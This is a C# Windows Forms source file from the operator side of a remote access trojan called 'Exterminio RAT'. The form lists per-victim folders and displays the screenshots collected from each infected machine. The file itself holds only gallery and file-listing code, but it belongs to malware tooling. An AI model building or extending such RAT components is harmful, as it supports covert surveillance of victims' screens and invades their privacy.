using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;

namespace Exterminio_RAT_Servidor
{
    public partial class GaleriaClientesFT : Form
    {
        private string currentSelectedClient = "";
        private string currentSelectedImage = "";
        private string baseDirectory;

        public GaleriaClientesFT()
        {
            InitializeComponent();
            baseDirectory = Application.StartupPath;
            InitializeGallery();
            SetupForm();
        }

        private void SetupForm()
        {
            // Configurar la ventana
            this.Text = "Galería de Clientes - Exterminio RAT";
            this.StartPosition = FormStartPosition.CenterScreen;
            this.FormBorderStyle = FormBorderStyle.FixedDialog;
            this.MaximizeBox = false;
            this.MinimizeBox = true;
        }

        private void InitializeGallery()
        {
            try
            {
                // Configurar eventos
                guna2ComboBox1SelectorCarpeta.SelectedIndexChanged += Guna2ComboBox1SelectorCarpeta_SelectedIndexChanged;
                guna2ComboBox1SelectorFoto.SelectedIndexChanged += Guna2ComboBox1SelectorFoto_SelectedIndexChanged;
                guna2ImageButton1.Click += Guna2ImageButton1_Click;

                // Configurar tooltip para el botón de recarga
                ToolTip tooltip = new ToolTip();
                tooltip.SetToolTip(guna2ImageButton1, "🔄 Recargar directorio base y actualizar galería");

                // Cargar carpetas de clientes
                LoadClientFolders();

                Console.WriteLine("Galería de clientes inicializada correctamente");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error inicializando galería: {ex.Message}");
            }
        }

        private void LoadClientFolders()
        {
            try
            {
                guna2ComboBox1SelectorCarpeta.Items.Clear();
                guna2ComboBox1SelectorCarpeta.Items.Add("-- Seleccionar Cliente --");

                // Lista de carpetas que NO son clientes
                string[] excludedFolders = { "Captures", "Sonidos", "bin", "obj", "Properties", "Resources" };

                // Buscar carpetas de clientes en el directorio base
                string[] clientFolders = Directory.GetDirectories(baseDirectory)
                    .Where(dir => {
                        string folderName = Path.GetFileName(dir);
                        
                        // Excluir carpetas que no son clientes
                        if (excludedFolders.Contains(folderName, StringComparer.OrdinalIgnoreCase))
                        {
                            return false;
                        }
                        
                        // Verificar si la carpeta tiene estructura de cliente (contiene subcarpeta Captures)
                        return Directory.Exists(Path.Combine(dir, "Captures"));
                    })
                    .Select(dir => Path.GetFileName(dir))
                    .ToArray();

                foreach (string clientId in clientFolders)
                {
                    guna2ComboBox1SelectorCarpeta.Items.Add(clientId);
                }

                if (guna2ComboBox1SelectorCarpeta.Items.Count > 1)
                {
                    guna2ComboBox1SelectorCarpeta.SelectedIndex = 0; // Seleccionar el primer item (placeholder)
                }

                Console.WriteLine($"Cargadas {clientFolders.Length} carpetas de clientes válidas");
                Console.WriteLine($"Carpetas excluidas: {string.Join(", ", excludedFolders)}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error cargando carpetas de clientes: {ex.Message}");
            }
        }

        private void Guna2ComboBox1SelectorCarpeta_SelectedIndexChanged(object sender, EventArgs e)
        {
            try
            {
                if (guna2ComboBox1SelectorCarpeta.SelectedIndex > 0) // No es el placeholder
                {
                    currentSelectedClient = guna2ComboBox1SelectorCarpeta.SelectedItem.ToString();
                    LoadClientImages(currentSelectedClient);
                    Console.WriteLine($"Cliente seleccionado: {currentSelectedClient}");
                }
                else
                {
                    currentSelectedClient = "";
                    guna2ComboBox1SelectorFoto.Items.Clear();
                    guna2PictureBox1Galeria.Image = null;
                    Console.WriteLine("Ningún cliente seleccionado");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error seleccionando cliente: {ex.Message}");
            }
        }

        private void LoadClientImages(string clientId)
        {
            try
            {
                guna2ComboBox1SelectorFoto.Items.Clear();
                guna2ComboBox1SelectorFoto.Items.Add("-- Seleccionar Imagen --");

                string capturesPath = Path.Combine(baseDirectory, clientId, "Captures");
                
                if (Directory.Exists(capturesPath))
                {
                    // Obtener archivos PNG de capturas
                    string[] imageFiles = Directory.GetFiles(capturesPath, "*.png")
                        .OrderByDescending(file => File.GetLastWriteTime(file)) // Más recientes primero
                        .Select(file => Path.GetFileName(file))
                        .ToArray();

                    foreach (string imageFile in imageFiles)
                    {
                        guna2ComboBox1SelectorFoto.Items.Add(imageFile);
                    }

                    if (guna2ComboBox1SelectorFoto.Items.Count > 1)
                    {
                        guna2ComboBox1SelectorFoto.SelectedIndex = 0; // Seleccionar placeholder
                    }

                    Console.WriteLine($"Cargadas {imageFiles.Length} imágenes para el cliente {clientId}");
                }
                else
                {
                    Console.WriteLine($"No se encontró la carpeta de capturas para el cliente {clientId}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error cargando imágenes del cliente {clientId}: {ex.Message}");
            }
        }

        private void Guna2ComboBox1SelectorFoto_SelectedIndexChanged(object sender, EventArgs e)
        {
            try
            {
                if (guna2ComboBox1SelectorFoto.SelectedIndex > 0 && !string.IsNullOrEmpty(currentSelectedClient))
                {
                    currentSelectedImage = guna2ComboBox1SelectorFoto.SelectedItem.ToString();
                    LoadImage(currentSelectedClient, currentSelectedImage);
                    Console.WriteLine($"Imagen seleccionada: {currentSelectedImage}");
                }
                else
                {
                    currentSelectedImage = "";
                    guna2PictureBox1Galeria.Image = null;
                    Console.WriteLine("Ninguna imagen seleccionada");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error seleccionando imagen: {ex.Message}");
            }
        }

        private void LoadImage(string clientId, string imageFileName)
        {
            try
            {
                string imagePath = Path.Combine(baseDirectory, clientId, "Captures", imageFileName);
                
                if (File.Exists(imagePath))
                {
                    // Cargar imagen en el PictureBox
                    using (var originalImage = Image.FromFile(imagePath))
                    {
                        // Crear una copia para evitar problemas de archivo bloqueado
                        Bitmap displayImage = new Bitmap(originalImage);
                        guna2PictureBox1Galeria.Image = displayImage;
                        
                        // Configurar PictureBox para mostrar la imagen correctamente
                        guna2PictureBox1Galeria.SizeMode = PictureBoxSizeMode.Zoom;
                        guna2PictureBox1Galeria.Refresh();
                    }

                    Console.WriteLine($"Imagen cargada: {imagePath}");
                }
                else
                {
                    Console.WriteLine($"Archivo de imagen no encontrado: {imagePath}");
                    guna2PictureBox1Galeria.Image = null;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error cargando imagen: {ex.Message}");
                guna2PictureBox1Galeria.Image = null;
            }
        }

        // Método público para refrescar la galería
        public void RefreshGallery()
        {
            try
            {
                LoadClientFolders();
                Console.WriteLine("Galería refrescada");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error refrescando galería: {ex.Message}");
            }
        }

        private void Guna2ImageButton1_Click(object sender, EventArgs e)
        {
            try
            {
                Console.WriteLine("Botón de recarga clickeado");
                
                // Guardar el directorio anterior para comparar
                string previousDirectory = baseDirectory;
                
                // Actualizar la ruta baseDirectory
                baseDirectory = Application.StartupPath;
                Console.WriteLine($"Directorio base actualizado: {baseDirectory}");
                
                // Verificar si el directorio cambió
                bool directoryChanged = !previousDirectory.Equals(baseDirectory, StringComparison.OrdinalIgnoreCase);
                
                // Limpiar selecciones actuales
                currentSelectedClient = "";
                currentSelectedImage = "";
                
                // Limpiar controles
                guna2ComboBox1SelectorFoto.Items.Clear();
                guna2PictureBox1Galeria.Image = null;
                
                // Recargar carpetas de clientes
                LoadClientFolders();
                
                // Mostrar notificación apropiada
                if (directoryChanged)
                {
                    ShowNotification("Directorio Cambiado", $"Directorio base actualizado a: {Path.GetFileName(baseDirectory)}", ToolTipIcon.Info);
                }
                else
                {
                    ShowNotification("Galería Recargada", "Galería actualizada con éxito", ToolTipIcon.Info);
                }
                
                Console.WriteLine("Recarga completada exitosamente");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error en recarga: {ex.Message}");
                ShowNotification("Error", $"Error al recargar galería: {ex.Message}", ToolTipIcon.Error);
            }
        }

        private void ShowNotification(string title, string message, ToolTipIcon icon = ToolTipIcon.Info)
        {
            try
            {
                // Buscar el formulario principal para acceder al NotifyIcon
                Form mainForm = Application.OpenForms.OfType<Form>().FirstOrDefault(f => f is Form1);
                if (mainForm != null && mainForm is Form1 form1)
                {
                    form1.ShowNotification(title, message, icon);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error mostrando notificación: {ex.Message}");
            }
        }
    }
}
